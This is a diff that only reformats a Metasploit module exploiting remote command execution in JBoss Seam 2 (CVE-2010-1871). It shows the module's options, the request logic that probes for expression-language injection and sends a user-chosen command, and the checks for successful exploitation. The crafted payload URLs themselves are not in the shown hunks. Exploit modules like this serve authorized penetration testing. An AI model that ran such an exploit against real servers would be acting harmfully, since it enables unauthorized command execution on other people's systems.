@@ -7,37 +7,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'            => 'JBoss Seam 2 Remote Command Execution',
-      'Description'     => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'JBoss Seam 2 Remote Command Execution',
+        'Description' => %q{
           JBoss Seam 2 (jboss-seam2), as used in JBoss Enterprise Application Platform
-        4.3.0 for Red Hat Linux, does not properly sanitize inputs for JBoss Expression
-        Language (EL) expressions, which allows remote attackers to execute arbitrary code
-        via a crafted URL. This modules also has been tested successfully against IBM
-        WebSphere 6.1 running on iSeries.
+          4.3.0 for Red Hat Linux, does not properly sanitize inputs for JBoss Expression
+          Language (EL) expressions, which allows remote attackers to execute arbitrary code
+          via a crafted URL. This modules also has been tested successfully against IBM
+          WebSphere 6.1 running on iSeries.
 
-        NOTE: this is only a vulnerability when the Java Security Manager is not properly
-        configured.
-      },
-      'Author'          =>
-        [
+          NOTE: this is only a vulnerability when the Java Security Manager is not properly
+          configured.
+        },
+        'Author' => [
           'guerrino di massa', # Metasploit module
           'Cristiano Maruti <cmaruti[at]gmail.com>' # Support for IBM Websphere 6.1
         ],
-      'License'         => MSF_LICENSE,
-      'References'      =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2010-1871' ],
           [ 'OSVDB', '66881']
         ],
-      'DisclosureDate' => '2010-07-19'))
+        'DisclosureDate' => '2010-07-19'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(8080),
         OptString.new('TARGETURI', [ true, 'Target URI', '/seam-booking/home.seam']),
         OptString.new('CMD', [ true, "The command to execute."])
-      ])
+      ]
+    )
   end
 
   def run
@@ -57,9 +60,10 @@ class MetasploitModule < Msf::Auxiliary
 
       res = send_request_cgi(
         {
-          'uri'    => req,
+          'uri' => req,
           'method' => 'GET',
-        }, 20)
+        }, 20
+      )
 
       if (res and res.headers['Location'] =~ %r(java.lang.Runtime.exec\%28java.lang.String\%29))
         flag_found_one = index
@@ -72,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    if (flag_found_one != 255 && flag_found_two != 255 )
+    if (flag_found_one != 255 && flag_found_two != 255)
       print_status("Target appears VULNERABLE!")
       print_status("Sending remote command:" + datastore["CMD"])
 
@@ -80,10 +84,10 @@ class MetasploitModule < Msf::Auxiliary
 
       res = send_request_cgi(
         {
-          'uri'    => req,
+          'uri' => req,
           'method' => 'GET',
-        }, 20)
-
+        }, 20
+      )
 
       if (res and res.headers['Location'] =~ %r(pwned=java.lang.UNIXProcess))
         print_good("Exploited successfully")
